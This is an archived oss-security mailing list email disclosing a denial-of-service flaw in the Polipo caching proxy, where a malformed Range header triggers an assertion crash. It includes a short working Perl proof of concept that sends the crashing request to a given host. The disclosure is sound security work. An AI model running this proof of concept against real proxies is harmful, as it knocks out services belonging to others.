X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3635" "Wednesday" "18" "November" "2020" "17:12:06" "+0200" "Alexandr Savca (chinarulezzz)" "alexandr.savca89@gmail.com" "<20201118171206.443be0215d1b142b5ce7584e@gmail.com>" "115" "[oss-security] Polipo: denial-of-service using range" nil nil nil "11" "2020111815:12:06" "[oss-security] Polipo: denial-of-service using range" (number mark "U       alexandr.sav Nov 18  115/3635  " thread-indent "\"[oss-security] Polipo: denial-of-service using range\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Polipo: denial-of-service using range" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15477 invoked by uid 550); 18 Nov 2020 15:30:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9588 invoked from network); 18 Nov 2020 15:12:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=date:from:to:subject:message-id:mime-version
         :content-transfer-encoding;
        bh=WmKHErWtP/AArYsyxViZLL7gby54Du5jVBUoyaVk6l4=;
        b=e3yYfD9gQr4tS8x+DMuGhftSEsMbRxOqhB2WacMx+vmbGhEHUMQqJzvSxNB1JN5uOL
         YbFciIj6FO2bSDfRNJ6dBXZRalsWZ0MfSN06H7P26oppImpqgEL/gmH77fQWvpAJWSvy
         kY4gp5D+cW5rRIYNZZ+UJB2SHVnedfEZ6MkXMtNEbjiyKQKdNRSI2+DrON7X+0AqZWRu
         ch8Q4GhO+ofOmwEqk4RGc0qPKPdtQ9dv3qcUlSfKiqPJoXW1K+ubU1jpitYFv8rDKgfl
         X1Qm5w7OGwLtQvBEQHh3zqrGR/tJBZADFKzDPBI5vzuilPfheOtWyYrmOsHWadzjLCes
         d0cg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:mime-version
         :content-transfer-encoding;
        bh=WmKHErWtP/AArYsyxViZLL7gby54Du5jVBUoyaVk6l4=;
        b=Aw8kLAGOIRQihvjosH8QLs+8bLx+a02mxWL9zueU3SN+Cj1PEMmDBsm4gn0M4L3h14
         Q7cNCk/eJ6HiQk5XmOEtNmsjz5eAXcr204VbbUgCoK4e0YFvYccCYK/uBwHS/ttmYVD6
         jJ8De5vXp/S+kzg7R/d54gVQ6YDxXTko4vWoOJ6ZZBZtXSbkr4ia+95jGtcxlzvpbHxg
         N6GC+3YKWliWmWOPWAHP8zDLIGPeHAoJ5wA7jRhJ+ocOvV2cTQ1WrD1aQBaRjDfDf+6M
         TJB5Zpqzs+oJkuHaF5i7fjhXTJjKCTweQBiXZkVEU3QiDEu7XkTFXJu1sDr4cG0roQVq
         pagQ==
X-Gm-Message-State: AOAM531mubJpYbG/GAnMSIQtSvXlcpPVipHuj2NeZr6q2FV8PEFo6vUu
	jitShaJyXECT7VtXlphLJlwxMDZihTabGN99
X-Google-Smtp-Source: ABdhPJybLm33LJwAxqWINck39MuJfLDub+a7qekVg7x6lzKA+tekxYurP96VGNpzdJnljUOHk9Z3lQ==
X-Received: by 2002:a2e:8808:: with SMTP id x8mr3848442ljh.384.1605712362535;
        Wed, 18 Nov 2020 07:12:42 -0800 (PST)
Date: Wed, 18 Nov 2020 17:12:06 +0200
From: Alexandr Savca (chinarulezzz) <alexandr.savca89@gmail.com>
To: oss-security@lists.openwall.com
Message-Id: <20201118171206.443be0215d1b142b5ce7584e@gmail.com>
X-Mailer: Sylpheed 3.7.0 (GTK+ 2.24.32; x86_64-unknown-linux-gnu)
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit
Subject: [oss-security] Polipo: denial-of-service using range

Hi all,


I suppose I found a vulnerability in the Polipo [1],
lightweight, caching web proxy.


Since the author wrote that he no longer maintains this project [2]
I decided to write here because polipo is widely used in Linux/BSD [3],
and there are many maintainers.


Summary
=======

It is possible to cause a denial of service through a specific
Range header value.


Overview
========

RFC7233 states [4]:

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
A server that supports range requests MAY ignore or reject a Range
header field that consists of more than two overlapping ranges, or a
set of many small ranges that are not listed in ascending order,
since both are indications of either a broken client or a deliberate
denial-of-service attack (Section 6.1). ...
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Polipo doesn't ignore/reject the malformed header. Instead, it has
an assertion:

    server.c:1473: assert(from >= 0 && (to < 0 || to > from));

So, a malformed Range header ("Range: bytes=3-2" for example) will
cause an assertion failed.  This error handling allows an attacker
to cause a denial of service.


PoC
===

#!/usr/bin/perl
use autodie;
use Socket;

$host = $ARGV[0];
$port = $ARGV[1];

$iaddr = inet_aton($host);
$paddr = sockaddr_in($port, $iaddr);
$proto = getprotobyname('tcp');

socket(SOCK, PF_INET, SOCK_STREAM, $proto);
connect(SOCK, $paddr);
send(SOCK, "GET http:// HTTP/1.1\r\n", 0);
send(SOCK, "Range: bytes=3-2\r\n\r\n", 0);
print while <SOCK>;


Affected Versions
=================

All


Links
=====

[1] https://www.irif.fr/~jch//software/polipo/

[2] https://github.com/jech/polipo/commit/4d42ca1b5849518762d110f34b6ce2e03d6df9ec

[3] https://repology.org/project/polipo/badges

[4] https://tools.ietf.org/html/rfc7233#section-3.1

-- 
Kind Regards,
Alexandr

-----BEGIN PGP PUBLIC KEY BLOCK-----

mQENBFq+QgQBCADW52hQ0aRC/tqvQPPPSCdbBFjKPKKrS1l1sbjOtQKLoZwfsnuu
5a8UBgJzpTBBrHKz5ackfIBSmmsGJ33hRzDwwJJHeG3W1e2Y5alEmD+Yc/ck9Lgf
ed8Y1XKHp8exCy71/bUDWmoXHficWFVsGnlrVOeEZ9drF836dbQ2FDSmeLh+m+0X
ifI5+7eI8U4Tf5JrbacqqQnsJBB3EfnORi0hvvyYZsFKUF1ibHVDGpMgHifIoh9t
B/sAYgz0wXa9v4s2U2zMXymg/rirpAs+UfewBkaE4RiQHUjqnKYSWqXpT7uuyPNl
Dm1ChyPbmJ20rTi1SDNrhvRWU+agExaKUqXrABEBAAG0OkFsZXhhbmRyIFNhdmNh
IChjaGluYXJ1bGV6enopIDxhbGV4YW5kci5zYXZjYTg5QGdtYWlsLmNvbT6JAU4E
EwEIADgWIQSy17a4VVrhcgmkZdVZ7BmG+9kCzwUCWr5CBAIbAwULCQgHAgYVCgkI
CwIEFgIDAQIeAQIXgAAKCRBZ7BmG+9kCz/CyB/4/G6rZFrc38jzhyaN+QwSZ/sFn
KtN7Qx3CAA0qNWDeBmPPwtyDC0s/n/3BtNFztJzeuoA5LSfBknJPchMu/N7qpmo/
kotQuUn53vv3SJwM22nN4Dtr9k/LWgY2EkovI5gGAMlxZuoD/mFujZzPq21QzgzG
Sm2qDTd1d9Ig/NiQ7S7yuPcyPKbl/4BwQd2zKB5LyNsmnoMxCFbc7Qhm+CS4OLr2
wPPbodXeG3blJSTKvcUbpU4VZIrpdbUssS8YvPvpmy/M3joPYaAKa5iCBWlT9my2
GPwbjQhISV/8NH9FQgAZi3QWotJ25tauI54Lf3cDbfRtThvXQjXbTJ78bY1vuQEN
BFq+QgQBCADLpvR4D0t1DUd9/8PHRzAL9ZaG3WQhXuTcydbCvTNNoepMakG+yM8E
1gjVuGz3fGPM5P92f59sQLWpqeHjVRtaFKn3f8O+ewhrArgAmP6WrzBIK/ovcXQ0
LjTo57yUQW1X1GWtHOXTvl4DCALr6KG5zcw8dpreJHAjIS1+4LRWs/vAJRUt2ORP
4JYanSwKn8ANshchMDkq+nlpssUren/PcAZ5oXlZM25zZIYKONP1SHby48v6v8jQ
kNa1f6UIkop4of0vt0WhKsoOlgTqO532UuDNorpktQi/TXgj1emn+HMCOAhMtPuW
8dd8HAu9Tgl25waear9gSGNPkdK15FZpABEBAAGJATYEGAEIACAWIQSy17a4VVrh
cgmkZdVZ7BmG+9kCzwUCWr5CBAIbDAAKCRBZ7BmG+9kCzzI3B/0TH4ikTcqHZAk/
SSizGKDXIoz5IkXkTcFo1lzIZabqIiT54vxl6fsPv5H/8cn3JUrU9aZKoLHh30kN
j0HhVcdltKh6nGnQnuYgRWhoEjE1PoGXAOlz4PTlc23jM7JFjynIuF/0jEnMk2AG
k3L+kDS7ReTAHQTSbJYLJwP2vDlEZ60b8xzXjYWRdDZwttfad0SkNcSAVYzbF3Gn
t6HHi81Ssqv9l5zAtxnFn7thoLegRFta+LnyIkEqkg8Z3VfHUAOuMO3W+bGDfAix
JnGdDlc2OCEcWoZVIuOiqEryff8wbgz5M0PVbby6y4Zop73LCJFm3Kz2n/jJOMJd
lgLES/Ed
=U0Dk
-----END PGP PUBLIC KEY BLOCK-----
